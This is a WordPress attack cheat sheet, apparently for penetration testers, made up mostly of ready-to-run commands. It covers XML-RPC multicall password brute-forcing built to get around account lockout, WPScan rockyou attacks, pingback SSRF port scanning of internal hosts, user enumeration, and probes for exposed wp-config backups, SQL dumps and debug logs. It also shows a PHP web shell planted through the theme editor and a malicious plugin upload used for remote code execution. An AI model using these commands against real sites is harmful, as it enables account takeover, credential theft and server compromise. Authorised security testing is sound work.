# WordPress Testing — Manual Techniques & WPScan Advanced Usage

## XML-RPC Exploitation

```bash
# Check if xmlrpc.php is accessible
curl -s -X POST http://target.com/xmlrpc.php \
    -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodArgs></methodCall>'
# Response listing available methods = xmlrpc enabled

# Multicall brute-force (bypass account lockout):
# 1 HTTP request = up to 500 login attempts
curl -s -X POST http://target.com/xmlrpc.php \
    -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </struct></value>
  </data></array></value></param></params>
</methodCall>'

# WPScan multicall:
wpscan --url http://target.com \
    --usernames admin \
    --passwords /usr/share/wordlists/rockyou.txt \
    --password-attack xmlrpc-multicall

# Port scan via SSRF through xmlrpc.php pingback:
curl -s -X POST http://target.com/xmlrpc.php \
    -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>
    <params><param><value><string>http://INTERNAL_IP:PORT</string></value></param>
    <param><value><string>http://target.com/</string></value></param>
    </params></methodCall>'
# Timing difference reveals open/closed ports
```

## WordPress REST API Enumeration

```bash
# Enumerate users via REST API (WordPress 4.7+)
curl -s http://target.com/wp-json/wp/v2/users | jq '.[].slug'
curl -s http://target.com/wp-json/wp/v2/users?per_page=100 | jq '.[] | {id: .id, name: .name, slug: .slug}'

# Check if REST API is restricted:
curl -s http://target.com/wp-json/ | jq '.authentication'

# Posts endpoint (can reveal authors)
curl -s http://target.com/wp-json/wp/v2/posts | jq '.[].author'

# Media files
curl -s http://target.com/wp-json/wp/v2/media | jq '.[].source_url'

# Custom endpoints (check plugins)
curl -s http://target.com/wp-json/ | jq '.routes | keys[]' | grep -v "^/wp/"
```

## User Enumeration Techniques

```bash
# Method 1: Author archive URL (common)
curl -s -I "http://target.com/?author=1" | grep Location
# Redirects to /author/username/

# Method 2: REST API
curl -s "http://target.com/wp-json/wp/v2/users" | jq '.[].name'

# Method 3: Login page error messages
# POST /wp-login.php → "Invalid username" vs "Incorrect password"
# Different messages = username valid

# Method 4: oEmbed endpoint
curl -s "http://target.com/wp-json/oembed/1.0/embed?url=http://target.com/" | jq '.author_name'

# WPScan enumeration (all methods):
wpscan --url http://target.com --enumerate u1-100
```

## Plugin Vulnerability Exploitation

```bash
# Find vulnerable plugins via WPScan:
wpscan --url http://target.com --enumerate vp --api-token $TOKEN

# Common high-impact plugin vulns:
# - Elementor: various XSS/CSRF
# - WooCommerce: SQLi, payment bypass
# - Contact Form 7: file upload bypass
# - Yoast SEO: XSS
# - File Manager: unauthenticated file upload → RCE (CVE-2020-25213)
# - Duplicator: path traversal → credentials disclosure
# - GDPR Cookie Consent: SQLi

# Check plugin version manually:
curl -s http://target.com/wp-content/plugins/PLUGIN_NAME/readme.txt | head
# Or: /wp-content/plugins/PLUGIN_NAME/PLUGIN_NAME.php (header comment)
```

## Path Traversal to Config

```bash
# Common exposed configuration files:
curl -s http://target.com/wp-config.php.bak
curl -s http://target.com/wp-config.php~
curl -s http://target.com/wp-config.php.orig
curl -s http://target.com/wp-config.php.save
curl -s http://target.com/.wp-config.php.swp
curl -s http://target.com/wp-config-backup.php

# Database exports:
curl -s http://target.com/wp-content/backup.sql
curl -s http://target.com/backup.sql
curl -s http://target.com/dump.sql

# Debug log:
curl -s http://target.com/wp-content/debug.log | tail -50
```

## Authentication Bypass via Theme Editor

```bash
# If admin access obtained → RCE via theme editor:
# Appearance → Theme Editor → Select theme file (404.php)
# Add: <?php system($_GET['cmd']); ?>
# Save → access: http://target.com/?p=404&cmd=id

# Or via Plugin Editor:
# Plugins → Plugin Editor → select plugin → add shell

# Or via file upload (Theme/Plugin install):
# Create malicious plugin zip with shell.php
# Plugins → Add New → Upload Plugin → Install Now
```

## WPScan Output Parsing

```bash
# JSON output parse:
wpscan --url http://target.com --enumerate u,vp --api-token $TOKEN \
    --format json -o scan.json

# Extract user list:
jq -r '.users | keys[]' scan.json

# Extract vulnerable plugins:
jq '.plugins | to_entries[] | select(.value.vulnerabilities | length > 0) | {plugin: .key, vulns: [.value.vulnerabilities[].title]}' scan.json

# Extract severity ratings:
jq '.plugins | to_entries[] | .value.vulnerabilities[] | {plugin: .key, title: .title, severity: .references.cve}' scan.json
```

## Wordlists for WPScan

```bash
# Plugin-specific wordlists (SecLists):
/usr/share/seclists/Discovery/Web-Content/CMS/wordpress-plugins.fuzz.txt
/usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt

# Password lists (WP-specific):
/usr/share/seclists/Passwords/Common-Credentials/best1050.txt

# Using custom wordlist for aggressive plugin detection:
wpscan --url http://target.com \
    --plugins-detection aggressive \
    --wp-plugins-dir wp-content/plugins \
    --enumerate ap \
    --plugins-list /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
```
